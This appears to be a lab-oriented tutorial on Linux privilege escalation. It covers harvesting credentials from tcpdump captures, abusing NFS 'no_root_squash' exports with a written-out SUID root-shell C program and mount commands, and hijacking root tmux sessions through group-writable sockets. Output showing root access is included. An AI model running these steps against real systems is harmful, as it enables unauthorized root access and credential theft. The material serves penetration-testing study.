# Miscellaneous PrivEsc Techniques

## Passive Traffic Capture
- If `tcpdump` is installed, unprivileged users may still be able to capture network traffic.
- Tools like **net-creds** and **PCredz** can extract sensitive data from captured traffic, including:
  - Credit card numbers, SNMP community strings
  - **Net-NTLMv2, SMBv2, or Kerberos hashes** — crackable offline for plaintext passwords
  - Cleartext credentials from protocols like HTTP, FTP, POP, IMAP, telnet, SMTP
- Captured cleartext credentials may be directly reusable for privesc.

---

## Weak NFS Privileges

### Background
- NFS (Network File System) shares files/directories over the network on Unix/Linux (TCP/UDP port **2049**).
- Remote enumeration of exports:
```bash
showmount -e <target_ip>
```
Example output:
```
Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

### Key NFS Export Options
| Option | Behavior |
|---|---|
| `root_squash` | Root user accessing the share is mapped to `nfsnobody` (unprivileged) — files created are owned by `nfsnobody`, preventing SUID binary abuse |
| `no_root_squash` | Remote root retains root identity on the NFS server — **allows creation of malicious SUID binaries** |

Check export config:
```bash
cat /etc/exports
```
Vulnerable example:
```
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

### Exploitation (`no_root_squash`)

**1. Write a simple SUID shell binary** (on attacker machine, as root):
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
```bash
gcc shell.c -o shell
```

**2. Mount the NFS share locally, copy the binary, set SUID:**
```bash
sudo mount -t nfs <target_ip>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

**3. On the target (low-priv session), execute the binary:**
```bash
./shell
id
# uid=0(root) gid=0(root) groups=0(root)...
```

> Because the file was created by attacker's local **root** user and `no_root_squash` is set, the SUID bit is preserved and effective as root on the target.

---

## Hijacking Tmux Sessions

### Concept
- `tmux` allows detaching from a session while it keeps running in the background.
- If a **privileged user (e.g. root)** leaves a tmux session running with weak socket permissions, it can be hijacked by anyone with access to that socket.

### Example Setup (how it happens)
```bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```
- Session socket owned by `root:devs` — any user in the `devs` group can attach.

### Detection & Exploitation

**1. Check for running tmux processes:**
```bash
ps aux | grep tmux
```

**2. Confirm socket permissions:**
```bash
ls -la /shareds
# srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

**3. Check own group membership:**
```bash
id
# groups=1000(htb),1011(devs)
```

**4. If in the matching group, attach to the session:**
```bash
tmux -S /shareds
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## Key Takeaways
- **tcpdump access** → passive credential harvesting from network traffic.
- **NFS with `no_root_squash`** → mount, drop a SUID root-owned binary, execute locally as root.
- **Exposed tmux sockets owned by root** (with permissive group access) → direct session hijack to a root shell.